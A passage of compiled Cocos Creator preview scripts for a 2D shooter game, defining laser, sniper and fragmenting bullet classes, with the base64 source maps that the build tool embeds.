QUFDLGNBQWMsQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxDQUFDO29DQUN4RixxQkFBTSxJQUFJLENBQUMsZUFBZSxDQUFDLElBQUksQ0FBQyxFQUFBOztvQ0FBaEMsU0FBZ0MsQ0FBQzs7O29DQUVyQyxPQUFPLENBQUMsSUFBSSxDQUFDLENBQUM7Ozs7eUJBQ2pCLENBQUMsRUFBQzs7O0tBQ047SUFHRDs7U0FFSztJQUNDLHlDQUFVLEdBQWhCLFVBQWlCLEdBQVE7UUFBRSxjQUFPO2FBQVAsVUFBTyxFQUFQLHFCQUFPLEVBQVAsSUFBTztZQUFQLDZCQUFPOzt1Q0FBRyxPQUFPOztnQkFDeEMsc0JBQU8sSUFBSSxPQUFPLENBQUMsVUFBQyxPQUFPLEVBQUUsTUFBTTt3QkFDL0IsSUFBSSxHQUFHLEdBQUcsSUFBSSxDQUFDLENBQUMsQ0FBQyxDQUFDO3dCQUNsQixJQUFJLE9BQU8sR0FBRyxJQUFJLFFBQVEsRUFBRTs0QkFDeEIsR0FBRyxHQUFHLEdBQUcsQ0FBQyxJQUFJLENBQUM7eUJBQ2xCO3dCQUNELElBQUksR0FBRyxJQUFJLE1BQU0sRUFBRTt5QkFDbEI7d0JBQ0QsT0FBTyxFQUFFLENBQUM7b0JBQ2QsQ0FBQyxDQUFDLEVBQUM7OztLQUNOO0lBRUQsY0FBYztJQUVkLFlBQVk7SUFDTiw4Q0FBZSxHQUFyQixVQUFzQixJQUFhOzs7OztvQkFDL0IsZ0hBQWdIO29CQUNoSCxxQkFBTSxJQUFJLENBQUMsY0FBYyxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUMsR0FBRyxFQUFFLENBQUMsRUFBRSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUMsY0FBYyxFQUFFLENBQUMsTUFBTSxDQUFDLENBQUMsTUFBTSxDQUFDLEVBQUUsQ0FBQyxVQUFVLEVBQUUsQ0FBQyxDQUFDLEVBQUE7O3dCQUR0RyxnSEFBZ0g7d0JBQ2hILFNBQXNHLENBQUM7Ozs7O0tBQzFHO0lBekNnQixvQkFBb0I7UUFEeEMsT0FBTztPQUNhLG9CQUFvQixDQTBDeEM7SUFBRCwyQkFBQztDQTFDRCxBQTBDQyxJQUFBO2tCQTFDb0Isb0JBQW9CIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiLy8gTGVhcm4gVHlwZVNjcmlwdDpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vIExlYXJuIEF0dHJpYnV0ZTpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gTGVhcm4gbGlmZS1jeWNsZSBjYWxsYmFja3M6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcblxyXG5pbXBvcnQge0lDb21tYW5kSW50ZXJjZXB0b3J9IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvaW50ZXJjZXB0b3IvQ29tbWFuZEludGVyY2VwdG9yXCI7XHJcbmltcG9ydCBGYWNhZGUgZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9mYWNhZGUvRmFjYWRlXCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIENsb3NlVmlld0ludGVyY2VwdG9yIGltcGxlbWVudHMgSUNvbW1hbmRJbnRlcmNlcHRvciB7XHJcblxyXG4gICAgLyoqXHJcbiAgICAgKiDlhbPpl612aWV35LmL5YmN5aSE55CGXHJcbiAgICAgKiAqL1xyXG4gICAgYXN5bmMgcHJlSGFuZGxlKC4uLmFyZ3MpOiBQcm9taXNlPGJvb2xlYW4+IHtcclxuICAgICAgICByZXR1cm4gbmV3IFByb21pc2U8Ym9vbGVhbj4oYXN5bmMgKHJlc29sdmUsIHJlamVjdCkgPT4ge1xyXG4gICAgICAgICAgICBsZXQgc3RyID0gYXJnc1swXTtcclxuICAgICAgICAgICAgaWYgKHR5cGVvZiBzdHIgIT0gXCJzdHJpbmdcIikge1xyXG4gICAgICAgICAgICAgICAgc3RyID0gc3RyLm5hbWU7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgaWYgKHN0ciA9PSBcInRhc2tcIikge1xyXG4gICAgICAgICAgICAgICAgbGV0IG5vZGUgPSB0eXBlb2YgYXJnc1swXSA9PSBcInN0cmluZ1wiID8gRmFjYWRlLmNhbnZhc05vZGUuZ2V0Q2hpbGRCeU5hbWUoc3RyKSA6IGFyZ3NbMF07XHJcbiAgICAgICAgICAgICAgICBhd2FpdCB0aGlzLm1vdmVGb2N1c1RvRG93bihub2RlKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICByZXNvbHZlKHRydWUpO1xyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICAvKipcclxuICAgICAqIOWFs+mXrXZpZXfkuYvlkI7lpITnkIZcclxuICAgICAqICovXHJcbiAgICBhc3luYyBwb3N0SGFuZGxlKHJlczogYW55LCAuLi5hcmdzKTogUHJvbWlzZSB7XHJcbiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHtcclxuICAgICAgICAgICAgbGV0IHN0ciA9IGFyZ3NbMF07XHJcbiAgICAgICAgICAgIGlmICh0eXBlb2Ygc3RyICE9IFwic3RyaW5nXCIpIHtcclxuICAgICAgICAgICAgICAgIHN0ciA9IHN0ci5uYW1lO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIGlmIChzdHIgPT0gXCJ0YXNrXCIpIHtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICByZXNvbHZlKCk7XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOWFs+mXreeql+WPo+eahOeJueaViCAqL1xyXG5cclxuICAgIC8qKiDku47kuIvmlrnnp7vlh7ogKi9cclxuICAgIGFzeW5jIG1vdmVGb2N1c1RvRG93bihub2RlOiBjYy5Ob2RlKSB7XHJcbiAgICAgICAgLy8gYXdhaXQgbm9kZS5ydW5BY3Rpb25Bd2FpdChjYy5tb3ZlQnkoMS41LCAwLCAtY2Mudmlldy5nZXRWaXNpYmxlU2l6ZSgpLmhlaWdodCkuZWFzaW5nKGNjLmVhc2VFbGFzdGljSW4oMC42KSkpO1xyXG4gICAgICAgIGF3YWl0IG5vZGUucnVuQWN0aW9uQXdhaXQoY2MubW92ZUJ5KDAuNSwgMCwgLWNjLnZpZXcuZ2V0VmlzaWJsZVNpemUoKS5oZWlnaHQpLmVhc2luZyhjYy5lYXNlQmFja0luKCkpKTtcclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bullet/BulletJiGuang.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '5191cP2MvJAj5S4Mn/Tj0r2', 'BulletJiGuang');
// script/app/entities/bullet/BulletJiGuang.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Bullet_1 = require("./Bullet");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var BulletJiGuang = /** @class */ (function (_super) {
    __extends(BulletJiGuang, _super);
    function BulletJiGuang() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    BulletJiGuang.prototype.fly = function (dir, distance, speed) {
    };
    BulletJiGuang.prototype.onCollisionEnter = function (other, self) {
        var _this = this;
        _super.prototype.onCollisionEnter.call(this, other, self);
        var action = cc.repeatForever(cc.sequence(cc.delayTime(0.3), cc.callFunc(function () {
            _super.prototype.onCollisionEnter.call(_this, other, self);
        })));
        action.setTag(1333);
        other.node.stopActionByTag(1333);
        other.node.runAction(action);
    };
    BulletJiGuang.prototype.onCollisionExit = function (other, self) {
        other.node.stopActionByTag(1333);
    };
    BulletJiGuang = __decorate([
        ccclass
    ], BulletJiGuang);
    return BulletJiGuang;
}(Bullet_1.default));
exports.default = BulletJiGuang;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldC9CdWxsZXRKaUd1YW5nLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQSxtQ0FBOEI7QUFDeEIsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBMkMsaUNBQU07SUFBakQ7O0lBb0JBLENBQUM7SUFqQkcsMkJBQUcsR0FBSCxVQUFJLEdBQVksRUFBRSxRQUFnQixFQUFFLEtBQWE7SUFDakQsQ0FBQztJQUdELHdDQUFnQixHQUFoQixVQUFpQixLQUFLLEVBQUUsSUFBSTtRQUE1QixpQkFRQztRQVBHLGlCQUFNLGdCQUFnQixZQUFDLEtBQUssRUFBRSxJQUFJLENBQUMsQ0FBQztRQUNwQyxJQUFJLE1BQU0sR0FBRyxFQUFFLENBQUMsYUFBYSxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUMsRUFBRSxDQUFDLFNBQVMsQ0FBQyxHQUFHLENBQUMsRUFBRSxFQUFFLENBQUMsUUFBUSxDQUFDO1lBQ3JFLGlCQUFNLGdCQUFnQixhQUFDLEtBQUssRUFBRSxJQUFJLENBQUMsQ0FBQztRQUN4QyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7UUFDTCxNQUFNLENBQUMsTUFBTSxDQUFDLElBQUksQ0FBQyxDQUFDO1FBQ3BCLEtBQUssQ0FBQyxJQUFJLENBQUMsZUFBZSxDQUFDLElBQUksQ0FBQyxDQUFDO1FBQ2pDLEtBQUssQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLE1BQU0sQ0FBQyxDQUFDO0lBQ2pDLENBQUM7SUFFRCx1Q0FBZSxHQUFmLFVBQWdCLEtBQUssRUFBRSxJQUFJO1FBQ3ZCLEtBQUssQ0FBQyxJQUFJLENBQUMsZUFBZSxDQUFDLElBQUksQ0FBQyxDQUFDO0lBQ3JDLENBQUM7SUFuQmdCLGFBQWE7UUFEakMsT0FBTztPQUNhLGFBQWEsQ0FvQmpDO0lBQUQsb0JBQUM7Q0FwQkQsQUFvQkMsQ0FwQjBDLGdCQUFNLEdBb0JoRDtrQkFwQm9CLGFBQWEiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuaW1wb3J0IEJ1bGxldCBmcm9tIFwiLi9CdWxsZXRcIjtcclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBCdWxsZXRKaUd1YW5nIGV4dGVuZHMgQnVsbGV0IHtcclxuXHJcblxyXG4gICAgZmx5KGRpcjogY2MuVmVjMiwgZGlzdGFuY2U6IG51bWJlciwgc3BlZWQ6IG51bWJlcik6IHZvaWQge1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICBvbkNvbGxpc2lvbkVudGVyKG90aGVyLCBzZWxmKSB7XHJcbiAgICAgICAgc3VwZXIub25Db2xsaXNpb25FbnRlcihvdGhlciwgc2VsZik7XHJcbiAgICAgICAgbGV0IGFjdGlvbiA9IGNjLnJlcGVhdEZvcmV2ZXIoY2Muc2VxdWVuY2UoY2MuZGVsYXlUaW1lKDAuMyksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgIHN1cGVyLm9uQ29sbGlzaW9uRW50ZXIob3RoZXIsIHNlbGYpO1xyXG4gICAgICAgIH0pKSk7XHJcbiAgICAgICAgYWN0aW9uLnNldFRhZygxMzMzKTtcclxuICAgICAgICBvdGhlci5ub2RlLnN0b3BBY3Rpb25CeVRhZygxMzMzKTtcclxuICAgICAgICBvdGhlci5ub2RlLnJ1bkFjdGlvbihhY3Rpb24pO1xyXG4gICAgfVxyXG5cclxuICAgIG9uQ29sbGlzaW9uRXhpdChvdGhlciwgc2VsZil7XHJcbiAgICAgICAgb3RoZXIubm9kZS5zdG9wQWN0aW9uQnlUYWcoMTMzMyk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bullet/BulletJuJiDan.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'aabefjCqDVKqrglQB8l3ylo', 'BulletJuJiDan');
// script/app/entities/bullet/BulletJuJiDan.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Bullet_1 = require("./Bullet");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var BulletJuJiDan = /** @class */ (function (_super) {
    __extends(BulletJuJiDan, _super);
    function BulletJuJiDan() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    BulletJuJiDan.prototype.fly = function (dir, distance, speed) {
        var _this = this;
        this.node.rotation = 90 - cc.misc.radiansToDegrees(Math.atan2(dir.y, dir.x));
        this.node.runAction(cc.sequence(cc.moveBy(distance / speed, dir.mul(distance)).easing(cc.easeCubicActionOut()), cc.callFunc(function () {
            _this.node.active = false;
        })));
    };
    BulletJuJiDan = __decorate([
        ccclass
    ], BulletJuJiDan);
    return BulletJuJiDan;
}(Bullet_1.default));
exports.default = BulletJuJiDan;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldC9CdWxsZXRKdUppRGFuLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQSxtQ0FBOEI7QUFFeEIsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBMkMsaUNBQU07SUFBakQ7O0lBU0EsQ0FBQztJQU5HLDJCQUFHLEdBQUgsVUFBSSxHQUFZLEVBQUUsUUFBZ0IsRUFBRSxLQUFhO1FBQWpELGlCQUtDO1FBSkcsSUFBSSxDQUFDLElBQUksQ0FBQyxRQUFRLEdBQUcsRUFBRSxHQUFHLEVBQUUsQ0FBQyxJQUFJLENBQUMsZ0JBQWdCLENBQUMsSUFBSSxDQUFDLEtBQUssQ0FBQyxHQUFHLENBQUMsQ0FBQyxFQUFFLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO1FBQzdFLElBQUksQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUMsRUFBRSxDQUFDLE1BQU0sQ0FBQyxRQUFRLEdBQUMsS0FBSyxFQUFFLEdBQUcsQ0FBQyxHQUFHLENBQUMsUUFBUSxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsRUFBRSxDQUFDLGtCQUFrQixFQUFFLENBQUMsRUFBRSxFQUFFLENBQUMsUUFBUSxDQUFDO1lBQ3RILEtBQUksQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztRQUM3QixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7SUFDVCxDQUFDO0lBUmdCLGFBQWE7UUFEakMsT0FBTztPQUNhLGFBQWEsQ0FTakM7SUFBRCxvQkFBQztDQVRELEFBU0MsQ0FUMEMsZ0JBQU0sR0FTaEQ7a0JBVG9CLGFBQWEiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuaW1wb3J0IEJ1bGxldCBmcm9tIFwiLi9CdWxsZXRcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgQnVsbGV0SnVKaURhbiBleHRlbmRzIEJ1bGxldCB7XHJcblxyXG5cclxuICAgIGZseShkaXI6IGNjLlZlYzIsIGRpc3RhbmNlOiBudW1iZXIsIHNwZWVkOiBudW1iZXIpOiB2b2lkIHtcclxuICAgICAgICB0aGlzLm5vZGUucm90YXRpb24gPSA5MCAtIGNjLm1pc2MucmFkaWFuc1RvRGVncmVlcyhNYXRoLmF0YW4yKGRpci55LCBkaXIueCkpO1xyXG4gICAgICAgIHRoaXMubm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2MubW92ZUJ5KGRpc3RhbmNlL3NwZWVkLCBkaXIubXVsKGRpc3RhbmNlKSkuZWFzaW5nKGNjLmVhc2VDdWJpY0FjdGlvbk91dCgpKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgdGhpcy5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIH0pKSk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bullet/BulletLiZiPao.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'd49a3xULQFGQaanbQQSAKQb', 'BulletLiZiPao');
// script/app/entities/bullet/BulletLiZiPao.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Bullet_1 = require("./Bullet");
var BulletEmitter_1 = require("../bulletEmitter/BulletEmitter");
var World_1 = require("../../info/World");
var ExcelConfig_1 = require("../../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../../config/ExcelTableNames");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var BulletLiZiPao = /** @class */ (function (_super) {
    __extends(BulletLiZiPao, _super);
    function BulletLiZiPao() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this._distance = 0;
        _this._speed = 0;
        return _this;
    }
    BulletLiZiPao.prototype.boom = function () {
        var powerLv = World_1.World.My.armory.levelOfEmitterPower(this.bulletId);
        var config = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.WeaponUp);
        var add = config[powerLv - 1]['bullet_split'];
        var num = 4 + 2 * add;
        var _loop_1 = function (i) {
            var degree = i * 360 / num;
            var newBullet = window['GameBulletsController'].getInactiveBullet(BulletEmitter_1.default.TYPES.LiZiPao + 100);
            newBullet.node.rotation = this_1.node.rotation + degree;
            var dir = cc.v2(0, 1).normalize().rotate(cc.misc.degreesToRadians(-newBullet.node.rotation));
            newBullet.node.position = this_1.node.position.add(dir.mul(130));
            newBullet.node.active = true;
            newBullet.node.runAction(cc.sequence(cc.moveBy(this_1._distance / this_1._speed, dir.mul(this_1._distance)), cc.callFunc(function () {
                newBullet.node.active = false;
            })));
        };
        var this_1 = this;
        for (var i = 0; i < num; i++) {
            _loop_1(i);
        }
    };
    BulletLiZiPao.prototype.fly = function (dir, distance, speed) {
        var _this = this;
        this._distance = distance;
        this._speed = speed;
        this.node.rotation = 90 - cc.misc.radiansToDegrees(Math.atan2(dir.y, dir.x));
        this.node.runAction(cc.sequence(cc.moveBy(distance / speed, dir.mul(distance)), cc.callFunc(function () {
            _this.node.active = false;
        })));
    };
    BulletLiZiPao.prototype.collisionEnemy = function (other, self) {
        _super.prototype.collisionEnemy.call(this, other, self);
        this.boom();
    };
    BulletLiZiPao = __decorate([
        ccclass
    ], BulletLiZiPao);
    return BulletLiZiPao;
}(Bullet_1.default));
exports.default = BulletLiZiPao;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldC9CdWxsZXRMaVppUGFvLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQSxtQ0FBOEI7QUFDOUIsZ0VBQTJEO0FBQzNELDBDQUF1QztBQUN2Qyx3RUFBcUU7QUFDckUsZ0VBQTZEO0FBRXZELElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQTJDLGlDQUFNO0lBQWpEO1FBQUEscUVBc0NDO1FBcENXLGVBQVMsR0FBRyxDQUFDLENBQUM7UUFDZCxZQUFNLEdBQUcsQ0FBQyxDQUFDOztJQW1DdkIsQ0FBQztJQWpDRyw0QkFBSSxHQUFKO1FBQ0ksSUFBSSxPQUFPLEdBQUcsYUFBSyxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUMsbUJBQW1CLENBQUMsSUFBSSxDQUFDLFFBQVEsQ0FBQyxDQUFDO1FBQ2pFLElBQUksTUFBTSxHQUFHLHlCQUFXLENBQUMsYUFBYSxDQUFDLGlDQUFlLENBQUMsUUFBUSxDQUFDLENBQUM7UUFDakUsSUFBSSxHQUFHLEdBQUcsTUFBTSxDQUFDLE9BQU8sR0FBQyxDQUFDLENBQUMsQ0FBQyxjQUFjLENBQUMsQ0FBQztRQUM1QyxJQUFJLEdBQUcsR0FBRyxDQUFDLEdBQUcsQ0FBQyxHQUFHLEdBQUcsQ0FBQztnQ0FDYixDQUFDO1lBQ04sSUFBSSxNQUFNLEdBQUcsQ0FBQyxHQUFHLEdBQUcsR0FBQyxHQUFHLENBQUM7WUFDekIsSUFBSSxTQUFTLEdBQUcsTUFBTSxDQUFDLHVCQUF1QixDQUFDLENBQUMsaUJBQWlCLENBQUMsdUJBQWEsQ0FBQyxLQUFLLENBQUMsT0FBTyxHQUFHLEdBQUcsQ0FBQyxDQUFDO1lBQ3JHLFNBQVMsQ0FBQyxJQUFJLENBQUMsUUFBUSxHQUFHLE9BQUssSUFBSSxDQUFDLFFBQVEsR0FBRyxNQUFNLENBQUM7WUFDdEQsSUFBSSxHQUFHLEdBQUcsRUFBRSxDQUFDLEVBQUUsQ0FBQyxDQUFDLEVBQUUsQ0FBQyxDQUFDLENBQUMsU0FBUyxFQUFFLENBQUMsTUFBTSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUMsZ0JBQWdCLENBQUMsQ0FBQyxTQUFTLENBQUMsSUFBSSxDQUFDLFFBQVEsQ0FBQyxDQUFDLENBQUM7WUFDN0YsU0FBUyxDQUFDLElBQUksQ0FBQyxRQUFRLEdBQUcsT0FBSyxJQUFJLENBQUMsUUFBUSxDQUFDLEdBQUcsQ0FBQyxHQUFHLENBQUMsR0FBRyxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUM7WUFDL0QsU0FBUyxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDO1lBRTdCLFNBQVMsQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUMsRUFBRSxDQUFDLE1BQU0sQ0FBQyxPQUFLLFNBQVMsR0FBQyxPQUFLLE1BQU0sRUFBRSxHQUFHLENBQUMsR0FBRyxDQUFDLE9BQUssU0FBUyxDQUFDLENBQUMsRUFBRSxFQUFFLENBQUMsUUFBUSxDQUFDO2dCQUM3RyxTQUFTLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7WUFDbEMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDOzs7UUFWVCxLQUFLLElBQUksQ0FBQyxHQUFDLENBQUMsRUFBRSxDQUFDLEdBQUMsR0FBRyxFQUFFLENBQUMsRUFBRTtvQkFBZixDQUFDO1NBV1Q7SUFDTCxDQUFDO0lBRUQsMkJBQUcsR0FBSCxVQUFJLEdBQVksRUFBRSxRQUFnQixFQUFFLEtBQWE7UUFBakQsaUJBT0M7UUFORyxJQUFJLENBQUMsU0FBUyxHQUFHLFFBQVEsQ0FBQztRQUMxQixJQUFJLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztRQUNwQixJQUFJLENBQUMsSUFBSSxDQUFDLFFBQVEsR0FBRyxFQUFFLEdBQUcsRUFBRSxDQUFDLElBQUksQ0FBQyxnQkFBZ0IsQ0FBQyxJQUFJLENBQUMsS0FBSyxDQUFDLEdBQUcsQ0FBQyxDQUFDLEVBQUUsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7UUFDN0UsSUFBSSxDQUFDLElBQUksQ0FBQyxTQUFTLENBQUMsRUFBRSxDQUFDLFFBQVEsQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDLFFBQVEsR0FBQyxLQUFLLEVBQUUsR0FBRyxDQUFDLEdBQUcsQ0FBQyxRQUFRLENBQUMsQ0FBQyxFQUFFLEVBQUUsQ0FBQyxRQUFRLENBQUM7WUFDdEYsS0FBSSxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO1FBQzdCLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztJQUNULENBQUM7SUFFUyxzQ0FBYyxHQUF4QixVQUF5QixLQUFLLEVBQUUsSUFBSTtRQUNoQyxpQkFBTSxjQUFjLFlBQUMsS0FBSyxFQUFFLElBQUksQ0FBQyxDQUFDO1FBQ2xDLElBQUksQ0FBQyxJQUFJLEVBQUUsQ0FBQztJQUNoQixDQUFDO0lBcENnQixhQUFhO1FBRGpDLE9BQU87T0FDYSxhQUFhLENBc0NqQztJQUFELG9CQUFDO0NBdENELEFBc0NDLENBdEMwQyxnQkFBTSxHQXNDaEQ7a0JBdENvQixhQUFhIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCBCdWxsZXQgZnJvbSBcIi4vQnVsbGV0XCI7XHJcbmltcG9ydCBCdWxsZXRFbWl0dGVyIGZyb20gXCIuLi9idWxsZXRFbWl0dGVyL0J1bGxldEVtaXR0ZXJcIjtcclxuaW1wb3J0IHtXb3JsZH0gZnJvbSBcIi4uLy4uL2luZm8vV29ybGRcIjtcclxuaW1wb3J0IHtFeGNlbENvbmZpZ30gZnJvbSBcIi4uLy4uLy4uLy4uL2ZyYW1ld29yay9jb25maWcvRXhjZWxDb25maWdcIjtcclxuaW1wb3J0IHtFeGNlbFRhYmxlTmFtZXN9IGZyb20gXCIuLi8uLi9jb25maWcvRXhjZWxUYWJsZU5hbWVzXCI7XHJ